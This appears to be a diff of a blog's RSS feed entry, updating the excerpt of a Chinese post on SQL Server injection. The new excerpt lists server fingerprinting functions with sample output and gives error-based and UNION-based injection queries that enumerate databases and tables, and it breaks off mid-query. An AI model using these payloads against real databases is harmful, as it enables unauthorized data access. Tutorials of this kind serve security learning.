@@ -17,7 +17,7 @@
       <pubDate>Tue, 04 Sep 2018 10:09:17 +0800</pubDate>
       
       <guid>http://wyb0.com/posts/sqlserver-injection/</guid>
-      <description> 0x00 基础信息探测 @@version @@SERVERNAME @@SERVICENAME ORIGINAL_LOGIN() SYSTEM_USER SUSER_NAME() HOST_NAME() HOST_ID() SESSION_USER CURRENT_USER USER USER_NAME() USER_ID() USER_SID()  </description>
+      <description>0x00 基础信息探测 @@VERSION,@@SERVERNAME,@@SERVICENAME; --Microsoft SQL Server 2008 (RTM) - 10.0.1600.22 (X64) --WIN-2008 --MSSQLSERVER USER,CURRENT_USER,SESSION_USER,SYSTEM_USER; --dbo --dbo --dbo --sa USER_NAME(),HOST_NAME(),HOST_ID(),SUSER_NAME(); --dbo --wyb --46530 --sa USER_ID(),USER_SID(); --1 --&amp;lt;01&amp;gt; ORIGINAL_LOGIN(); --sa  0x01 判断是否为sa权限 0x02 进行注入  得到所有数据库名字 --报错得到数据库名，前6个是系统自带的数据库，所以从第7个开始，dbid依次增加即可得到所有数据库 select id,name from msg where id=1 and 0&amp;lt;&amp;gt;(select name from master.dbo.sysdatabases where dbid=7);   得到数据库test的所有表名（用户创建的表xtype的值是U）   --得到数据库test的第一张表 select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sysobjects where xtype=&#39;U&#39;; --得到数据库test的第二张表 select id,name from msg where id=-1 union select top 1 id,name from test.</description>
     </item>
     
     <item>
